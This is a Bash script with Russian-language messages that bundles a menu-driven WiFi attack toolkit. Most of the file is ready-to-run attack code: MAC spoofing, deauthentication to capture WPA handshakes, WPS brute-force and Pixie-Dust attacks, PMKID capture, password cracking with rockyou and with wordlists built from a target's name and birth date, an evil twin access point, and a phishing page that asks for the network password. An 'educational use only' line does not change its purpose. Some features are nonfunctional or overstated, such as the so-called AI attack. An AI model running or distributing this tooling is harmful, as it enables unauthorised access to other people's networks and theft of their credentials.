#!/bin/bash

# ==================== КОНФИГУРАЦИЯ ====================
VERSION="3.0 Professional"
AUTHOR="Based on ankit0183/Wifi-Hacking"
WORKING_DIR="/tmp/wifi_hack"
HANDSHAKE_DIR="$WORKING_DIR/handshakes"
WORDLIST_DIR="$WORKING_DIR/wordlists"
LOG_FILE="$WORKING_DIR/wifi_hack.log"

# ==================== ЦВЕТА ДЛЯ ВЫВОДА ====================
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# ==================== ФУНКЦИИ ====================

init_dirs() {
    mkdir -p $HANDSHAKE_DIR $WORDLIST_DIR
    touch $LOG_FILE
    echo "[$(date)] Script started" >> $LOG_FILE
}

check_root() {
    if [[ $EUID -ne 0 ]]; then
        echo -e "${RED}[!] Этот скрипт должен запускаться с правами root!${NC}"
        exit 1
    fi
}

check_dependencies() {
    echo -e "${CYAN}[*] Проверка зависимостей...${NC}"
    
    declare -A tools=(
        ["aircrack-ng"]="aircrack-ng"
        ["airodump-ng"]="aircrack-ng"
        ["airmon-ng"]="aircrack-ng"
        ["aireplay-ng"]="aircrack-ng"
        ["bully"]="bully"
        ["reaver"]="reaver"
        ["wash"]="reaver"
        ["crunch"]="crunch"
        ["macchanger"]="macchanger"
        ["hashcat"]="hashcat"
        ["hcxpcapngtool"]="hcxtools"
        ["hcxdumptool"]="hcxtools"
        ["hostapd"]="hostapd"
        ["dnsmasq"]="dnsmasq"
        ["lighttpd"]="lighttpd"
        ["php-cgi"]="php"
        ["iptables"]="iptables"
    )
    
    missing_tools=()
    
    for tool in "${!tools[@]}"; do
        if ! command -v $tool &>/dev/null; then
            echo -e "${YELLOW}[!] $tool не установлен${NC}"
            missing_tools+=("${tools[$tool]}")
        else
            echo -e "${GREEN}[✓] $tool установлен${NC}"
        fi
    done
    
    if [[ ${#missing_tools[@]} -gt 0 ]]; then
        echo -e "\n${YELLOW}[!] Найдены отсутствующие инструменты${NC}"
        unique_tools=$(echo "${missing_tools[@]}" | tr ' ' '\n' | sort -u)
        echo "Будут установлены: $unique_tools"
        read -p "Установить все автоматически? (y/n): " -n 1 -r
        echo
        if [[ $REPLY =~ ^[Yy]$ ]]; then
            apt-get update
            apt-get install ${unique_tools[@]} -y
            echo -e "${GREEN}[✓] Все зависимости установлены${NC}"
        else
            echo -e "${RED}[!] Некоторые зависимости отсутствуют. Скрипт может работать некорректно.${NC}"
        fi
    fi
}

show_banner() {
    clear
    echo -e "${PURPLE}"
    cat << "EOF"
 ██████╗  █████╗ ███╗   ██╗ ██████╗██╗  ██╗██╗  ██╗
 ██╔══██╗██╔══██╗████╗  ██║██╔════╝██║  ██║██║ ██╔╝
 ██████╔╝███████║██╔██╗ ██║██║     ███████║█████╔╝
 ██╔═══╝ ██╔══██║██║╚██╗██║██║     ██╔══██║██╔═██╗
 ██║     ██║  ██║██║ ╚████║╚██████╗██║  ██╗██║  ██╗
 ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝
EOF
    echo -e "${NC}"
    echo -e "${BLUE}==============================================${NC}"
    echo -e "${GREEN}      WIFI HACKING TOOL (Bash Version)${NC}"
    echo -e "${YELLOW}       Based on ankit0183/Wifi-Hacking${NC}"
    echo -e "${BLUE}==============================================${NC}"
    echo
}

show_menu() {
    echo -e "${CYAN}╔══════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║               ОСНОВНОЕ МЕНЮ                  ║${NC}"
    echo -e "${CYAN}╠══════════════════════════════════════════════╣${NC}"
    echo -e "${CYAN}║  ${GREEN}1${NC})  Start monitor mode                    ║"
    echo -e "${CYAN}║  ${GREEN}2${NC})  Stop monitor mode                     ║"
    echo -e "${CYAN}║  ${GREEN}3${NC})  Scan Networks                         ║"
    echo -e "${CYAN}║  ${GREEN}4${NC})  Getting Handshake                     ║"
    echo -e "${CYAN}║  ${GREEN}5${NC})  WPS Networks attacks                  ║"
    echo -e "${CYAN}║  ${GREEN}6${NC})  Scan for WPS Networks                 ║"
    echo -e "${CYAN}║  ${GREEN}7${NC})  Create wordlist                       ║"
    echo -e "${CYAN}║  ${GREEN}8${NC})  Install Wireless tools                ║"
    echo -e "${CYAN}║  ${GREEN}9${NC})  Crack Handshake with rockyou.txt      ║"
    echo -e "${CYAN}║  ${GREEN}10${NC}) Crack Handshake with wordlist         ║"
    echo -e "${CYAN}║  ${GREEN}11${NC}) Crack Handshake without wordlist      ║"
    echo -e "${CYAN}║                                                ║${NC}"
    echo -e "${CYAN}║  ${YELLOW}12${NC}) AI-Powered Smart Attack (NEW!)       ║"
    echo -e "${CYAN}║  ${YELLOW}13${NC}) Capture PMKID (NEW!)                 ║"
    echo -e "${CYAN}║  ${YELLOW}14${NC}) Evil Twin Attack (NEW!)              ║"
    echo -e "${CYAN}║  ${YELLOW}15${NC}) WiFi Pineapple Mode (NEW!)           ║"
    echo -e "${CYAN}║                                                ║${NC}"
    echo -e "${CYAN}║  ${BLUE}0${NC})  About Me                              ║"
    echo -e "${CYAN}║  ${RED}00${NC}) Exit                                 ║"
    echo -e "${CYAN}╚══════════════════════════════════════════════╝${NC}"
    echo
}

# 1. Start Monitor Mode
start_monitor() {
    echo -e "${BLUE}[*] Запуск monitor mode...${NC}"
    
    # Автоматический выбор интерфейса
    interfaces=$(iwconfig 2>/dev/null | grep -E "^[[:alnum:]]+" | grep -v "no wireless" | awk '{print $1}')
    
    if [[ -z "$interfaces" ]]; then
        echo -e "${RED}[!] Беспроводные интерфейсы не найдены!${NC}"
        return 1
    fi
    
    echo "Доступные интерфейсы:"
    select interface in $interfaces; do
        if [[ -n "$interface" ]]; then
            break
        fi
    done
    
    echo -e "${YELLOW}[*] Остановка мешающих процессов...${NC}"
    airmon-ng check kill > /dev/null 2>&1
    
    echo -e "${YELLOW}[*] Изменение MAC-адреса...${NC}"
    ifconfig $interface down
    macchanger -r $interface > /dev/null 2>&1
    ifconfig $interface up
    
    echo -e "${YELLOW}[*] Активация monitor mode...${NC}"
    airmon-ng start $interface > /dev/null 2>&1
    
    # Поиск интерфейса в режиме монитора
    monitor_iface=$(iwconfig 2>/dev/null | grep "Mode:Monitor" | awk '{print $1}')
    
    if [[ -n "$monitor_iface" ]]; then
        echo -e "${GREEN}[✓] Monitor mode активирован на $monitor_iface${NC}"
        echo "$monitor_iface" > $WORKING_DIR/monitor_iface
    else
        echo -e "${RED}[!] Не удалось активировать monitor mode${NC}"
    fi
}

# 2. Stop Monitor Mode
stop_monitor() {
    monitor_iface=$(cat $WORKING_DIR/monitor_iface 2>/dev/null)
    if [[ -n "$monitor_iface" ]]; then
        airmon-ng stop $monitor_iface > /dev/null 2>&1
        systemctl restart NetworkManager
        rm -f $WORKING_DIR/monitor_iface
        echo -e "${GREEN}[✓] Monitor mode остановлен${NC}"
    else
        echo -e "${YELLOW}[!] Нет активного monitor mode${NC}"
    fi
}

# 3. Scan Networks
scan_networks() {
    monitor_iface=$(cat $WORKING_DIR/monitor_iface 2>/dev/null)
    
    if [[ -z "$monitor_iface" ]]; then
        echo -e "${RED}[!] Сначала активируйте monitor mode!${NC}"
        return 1
    fi
    
    echo -e "${BLUE}[*] Сканирование сетей... (Ctrl+C для остановки)${NC}"
    echo -e "${YELLOW}[*] Сохранение результатов в $WORKING_DIR/scan.csv${NC}"
    
    # Запуск сканирования с сохранением результатов
    timeout 30 airodump-ng $monitor_iface --write $WORKING_DIR/scan --output-format csv &
    SCAN_PID=$!
    
    wait $SCAN_PID 2>/dev/null
    
    # Парсинг результатов
    if [[ -f "$WORKING_DIR/scan-01.csv" ]]; then
        echo -e "\n${GREEN}══════════════════════════════════════════════${NC}"
        echo -e "${GREEN}           ОБНАРУЖЕННЫЕ СЕТИ${NC}"
        echo -e "${GREEN}══════════════════════════════════════════════${NC}"
        
        # Извлечение информации о сетях
        awk -F',' 'NR > 6 && length($1) == 17 {print $1" | "$4" | "$6" | "$9}' $WORKING_DIR/scan-01.csv | head -20
    fi
}

# 4. Getting Handshake
get_handshake() {
    monitor_iface=$(cat $WORKING_DIR/monitor_iface 2>/dev/null)
    
    if [[ -z "$monitor_iface" ]]; then
        echo -e "${RED}[!] Сначала активируйте monitor mode!${NC}"
        return 1
    fi
    
    read -p "BSSID цели: " target_bssid
    read -p "Канал цели: " target_channel
    read -p "Имя файла для сохранения: " filename
    
    echo -e "${BLUE}[*] Захват handshake...${NC}"
    
    # Запуск захвата пакетов
    airodump-ng -c $target_channel --bssid $target_bssid -w $HANDSHAKE_DIR/$filename $monitor_iface &
    DUMP_PID=$!
    
    sleep 5
    
    # Атака деаутентификации
    echo -e "${YELLOW}[*] Запуск атаки деаутентификации...${NC}"
    aireplay-ng --deauth 10 -a $target_bssid $monitor_iface > /dev/null 2>&1 &
    
    sleep 15
    
    # Остановка захвата
    kill $DUMP_PID 2>/dev/null
    
    echo -e "${GREEN}[✓] Файлы сохранены в $HANDSHAKE_DIR/${NC}"
    
    # Проверка наличия handshake
    if [[ -f "$HANDSHAKE_DIR/$filename-01.cap" ]]; then
        echo -e "${YELLOW}[*] Проверка наличия handshake...${NC}"
        aircrack-ng $HANDSHAKE_DIR/$filename-01.cap | grep -q "Handshake"
        if [[ $? -eq 0 ]]; then
            echo -e "${GREEN}[✓] Handshake успешно захвачен!${NC}"
        else
            echo -e "${RED}[!] Handshake не найден. Попробуйте еще раз.${NC}"
        fi
    fi
}

# 5. WPS Networks attacks
wps_attack() {
    monitor_iface=$(cat $WORKING_DIR/monitor_iface 2>/dev/null)
    
    if [[ -z "$monitor_iface" ]]; then
        echo -e "${RED}[!] Сначала активируйте monitor mode!${NC}"
        return 1
    fi
    
    read -p "BSSID цели: " target_bssid
    read -p "Канал цели: " target_channel
    
    echo -e "${BLUE}[*] Запуск атаки на WPS...${NC}"
    
    # Попытка атаки с помощью reaver
    echo -e "${YELLOW}[*] Метод 1: Использование reaver${NC}"
    reaver -i $monitor_iface -b $target_bssid -c $target_channel -vv
    
    if [[ $? -ne 0 ]]; then
        # Альтернативный метод с bully
        echo -e "${YELLOW}[*] Метод 2: Использование bully${NC}"
        bully -b $target_bssid -c $target_channel $monitor_iface
    fi
}

# 6. Scan for WPS Networks
scan_wps() {
    monitor_iface=$(cat $WORKING_DIR/monitor_iface 2>/dev/null)
    
    if [[ -z "$monitor_iface" ]]; then
        echo -e "${RED}[!] Сначала активируйте monitor mode!${NC}"
        return 1
    fi
    
    echo -e "${BLUE}[*] Сканирование WPS сетей...${NC}"
    wash -i $monitor_iface
}

# 7. Create wordlist
create_wordlist() {
    echo -e "${BLUE}[*] Генератор wordlist${NC}"
    
    echo "1) Простая генерация"
    echo "2) Расширенная генерация"
    echo "3) Генерация на основе информации"
    read -p "Выберите тип: " wordlist_type
    
    case $wordlist_type in
        1)
            read -p "Минимальная длина: " min_len
            read -p "Максимальная длина: " max_len
            read -p "Имя файла: " filename
            
            crunch $min_len $max_len -o $WORDLIST_DIR/$filename.txt
            ;;
        2)
            read -p "Паттерн (например, pass@@@@): " pattern
            read -p "Имя файла: " filename
            
            crunch ${#pattern} ${#pattern} -t $pattern -o $WORDLIST_DIR/$filename.txt
            ;;
        3)
            read -p "Имя цели: " target_name
            read -p "Дата рождения (DDMMYYYY): " birth_date
            read -p "Дополнительные слова через запятую: " extra_words
            
            # Создание персонализированного wordlist
            echo "Создание персонализированного wordlist..."
            {
                echo $target_name
                echo ${target_name}123
                echo ${target_name}${birth_date}
                echo ${target_name}!
                echo $birth_date
                echo ${birth_date}${target_name}
                IFS=',' read -ra ADDR <<< "$extra_words"
                for word in "${ADDR[@]}"; do
                    echo "$word"
                    echo "${word}123"
                    echo "${word}${birth_date}"
                done
            } > $WORDLIST_DIR/personalized.txt
            
            echo -e "${GREEN}[✓] Wordlist создан: $WORDLIST_DIR/personalized.txt${NC}"
            ;;
    esac
}

# 8. Install Wireless tools
install_tools() {
    echo -e "${YELLOW}[*] Установка всех необходимых инструментов...${NC}"
    apt-get update
    apt-get install aircrack-ng reaver bully crunch hashcat hcxtools hostapd dnsmasq lighttpd php-cgi iptables macchanger -y
    echo -e "${GREEN}[✓] Все инструменты установлены!${NC}"
}

# 9. Crack Handshake with rockyou.txt
crack_rockyou() {
    read -p "Путь к handshake файлу: " handshake_file
    if [[ -f "/usr/share/wordlists/rockyou.txt.gz" ]]; then
        gunzip /usr/share/wordlists/rockyou.txt.gz
    fi
    aircrack-ng $handshake_file -w /usr/share/wordlists/rockyou.txt
}

# 10. Crack Handshake with wordlist
crack_wordlist() {
    read -p "Путь к handshake файлу: " handshake_file
    read -p "Путь к wordlist: " wordlist_path
    aircrack-ng $handshake_file -w $wordlist_path
}

# 11. Crack Handshake without wordlist
crack_no_wordlist() {
    read -p "Путь к handshake файлу: " handshake_file
    echo -e "${YELLOW}[*] Запуск атаки без wordlist (только для WEP)${NC}"
    aircrack-ng $handshake_file
}

# 12. AI-Powered Smart Attack
ai_smart_attack() {
    echo -e "${PURPLE}[*] AI-Powered Smart Attack Mode${NC}"
    echo -e "${YELLOW}[*] Анализ целей и выбор оптимального метода атаки...${NC}"
    
    # Проверка monitor mode
    monitor_iface=$(cat $WORKING_DIR/monitor_iface 2>/dev/null)
    
    if [[ -z "$monitor_iface" ]]; then
        echo -e "${RED}[!] Сначала активируйте monitor mode!${NC}"
        return 1
    fi
    
    # Анализ сетей и выбор цели
    if [[ ! -f "$WORKING_DIR/scan-01.csv" ]]; then
        scan_networks
    fi
    
    # Автоматический выбор уязвимой цели
    vulnerable_target=$(grep -i "wps\|wep" $WORKING_DIR/scan-01.csv 2>/dev/null | head -1 | cut -d',' -f1)
    
    if [[ -n "$vulnerable_target" ]]; then
        echo -e "${GREEN}[✓] Найдена потенциально уязвимая цель: $vulnerable_target${NC}"
        
        # Получение канала
        target_channel=$(grep "$vulnerable_target" $WORKING_DIR/scan-01.csv 2>/dev/null | cut -d',' -f4 | tr -d ' ')
        
        # Автоматический выбор метода атаки
        if echo "$vulnerable_target" | grep -qi "wps"; then
            echo -e "${BLUE}[*] Выбран метод: WPS Pixie-Dust Attack${NC}"
            reaver -i $monitor_iface -b $vulnerable_target -c $target_channel -K 1 -vv
        elif echo "$vulnerable_target" | grep -qi "wep"; then
            echo -e "${BLUE}[*] Выбран метод: WEP ARP Replay Attack${NC}"
            airodump-ng -c $target_channel --bssid $vulnerable_target -w $HANDSHAKE_DIR/wep_attack $monitor_iface &
            sleep 5
            aireplay-ng --arpreplay -b $vulnerable_target -h $(macchanger -s $monitor_iface | grep Current | awk '{print $3}') $monitor_iface
        else
            echo -e "${BLUE}[*] Выбран метод: Handshake Capture + Smart Bruteforce${NC}"
            get_handshake
        fi
    else
        echo -e "${RED}[!] Уязвимые цели не найдены${NC}"
        echo -e "${YELLOW}[*] Запуск стандартного сканирования...${NC}"
        scan_networks
    fi
}

# 13. Capture PMKID
capture_pmkid() {
    echo -e "${PURPLE}[*] Capture PMKID Attack${NC}"
    echo -e "${YELLOW}[*] Этот метод не требует деаутентификации клиентов${NC}"
    
    monitor_iface=$(cat $WORKING_DIR/monitor_iface 2>/dev/null)
    
    if [[ -z "$monitor_iface" ]]; then
        echo -e "${RED}[!] Сначала активируйте monitor mode!${NC}"
        return 1
    fi
    
    read -p "BSSID цели: " target_bssid
    read -p "Имя файла для сохранения: " filename
    
    echo -e "${BLUE}[*] Захват PMKID с помощью hcxdumptool...${NC}"
    
    # Захват PMKID
    hcxdumptool -i $monitor_iface -o $HANDSHAKE_DIR/$filename.pcapng --filterlist=<(echo $target_bssid) --filtermode=2 --enable_status=1 &
    HCX_PID=$!
    
    echo -e "${YELLOW}[*] Захват PMKID в течение 60 секунд... (Ctrl+C для остановки)${NC}"
    sleep 60
    
    kill $HCX_PID 2>/dev/null
    
    # Конвертация в формат hashcat
    if [[ -f "$HANDSHAKE_DIR/$filename.pcapng" ]]; then
        hcxpcapngtool $HANDSHAKE_DIR/$filename.pcapng -o $HANDSHAKE_DIR/$filename.hc22000
        
        if [[ -f "$HANDSHAKE_DIR/$filename.hc22000" ]]; then
            echo -e "${GREEN}[✓] PMKID захвачен и конвертирован${NC}"
            echo -e "${YELLOW}[*] Для взлома используйте: hashcat -m 22000 $HANDSHAKE_DIR/$filename.hc22000 wordlist.txt${NC}"
        else
            echo -e "${RED}[!] PMKID не найден в захваченных данных${NC}"
        fi
    fi
}

# 14. Evil Twin Attack
evil_twin_attack() {
    echo -e "${PURPLE}[*] Evil Twin Attack${NC}"
    echo -e "${YELLOW}[*] Создание поддельной точки доступа...${NC}"
    
    read -p "ESSID поддельной точки: " fake_essid
    read -p "Канал: " channel
    
    # Создание конфигурации hostapd
    cat > /tmp/hostapd.conf << EOF
interface=wlan1
driver=nl80211
ssid=$fake_essid
hw_mode=g
channel=$channel
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
wpa=2
wpa_passphrase=password123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP
rsn_pairwise=CCMP
EOF
    
    # Создание конфигурации dnsmasq
    cat > /tmp/dnsmasq.conf << EOF
interface=wlan1
dhcp-range=192.168.1.2,192.168.1.100,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
EOF
    
    echo -e "${YELLOW}[*] Настройка интерфейса...${NC}"
    ifconfig wlan1 up 192.168.1.1 netmask 255.255.255.0
    
    echo -e "${YELLOW}[*] Запуск поддельной точки доступа...${NC}"
    hostapd /tmp/hostapd.conf &
    dnsmasq -C /tmp/dnsmasq.conf -d &
    
    echo -e "${GREEN}[✓] Evil Twin запущен!${NC}"
    echo -e "${YELLOW}[*] Остановите атаку с помощью Ctrl+C${NC}"
    
    wait
}

# 15. WiFi Pineapple Mode
wifi_pineapple_mode() {
    echo -e "${PURPLE}[*] WiFi Pineapple Mode${NC}"
    echo -e "${YELLOW}[*] Запуск продвинутой MITM-атаки...${NC}"
    
    # Создание фишинговой страницы
    mkdir -p /var/www/html
    cat > /var/www/html/index.html << EOF
<!DOCTYPE html>
<html>
<head>
    <title>WiFi Login</title>
</head>
<body>
    <h1>WiFi Network Login</h1>
    <p>Please enter your password to connect:</p>
    <form method="POST">
        <input type="password" name="password" placeholder="Password">
        <button type="submit">Connect</button>
    </form>
</body>
</html>
EOF
    
    # Запуск веб-сервера
    lighttpd -f /etc/lighttpd/lighttpd.conf
    
    echo -e "${GREEN}[✓] WiFi Pineapple Mode активирован!${NC}"
    echo -e "${YELLOW}[*] Создана фишинговая страница на http://192.168.1.1${NC}"
}

# About Me
about_me() {
    echo -e "${BLUE}══════════════════════════════════════════════${NC}"
    echo -e "${GREEN}        О СКРИПТЕ${NC}"
    echo -e "${BLUE}══════════════════════════════════════════════${NC}"
    echo "Версия: $VERSION"
    echo "Автор: $AUTHOR"
    echo "GitHub: https://github.com/ankit0183/Wifi-Hacking"
    echo ""
    echo -e "${YELLOW}Использовать только в образовательных целях!${NC}"
    echo -e "${RED}Не нарушайте законы!${NC}"
    read -p "Нажмите Enter для продолжения..."
}

# Основной цикл программы
main() {
    check_root
    init_dirs
    check_dependencies
    
    while true; do
        show_banner
        show_menu
        
        echo -ne "${CYAN}Выберите опцию: ${NC}"
        read choice
        
        case $choice in
            1) start_monitor ;;
            2) stop_monitor ;;
            3) scan_networks ;;
            4) get_handshake ;;
            5) wps_attack ;;
            6) scan_wps ;;
            7) create_wordlist ;;
            8) install_tools ;;
            9) crack_rockyou ;;
            10) crack_wordlist ;;
            11) crack_no_wordlist ;;
            12) ai_smart_attack ;;
            13) capture_pmkid ;;
            14) evil_twin_attack ;;
            15) wifi_pineapple_mode ;;
            0) about_me ;;
            00)
                echo -e "${RED}[*] Выход...${NC}"
                echo "[$(date)] Script stopped" >> $LOG_FILE
                # Очистка временных файлов
                rm -rf $WORKING_DIR
                exit 0
                ;;
            *)
                echo -e "${RED}[!] Неверный выбор!${NC}"
                ;;
        esac
        
        echo ""
        read -p "Нажмите Enter для продолжения..."
    done
}

# Запуск основной функции
main
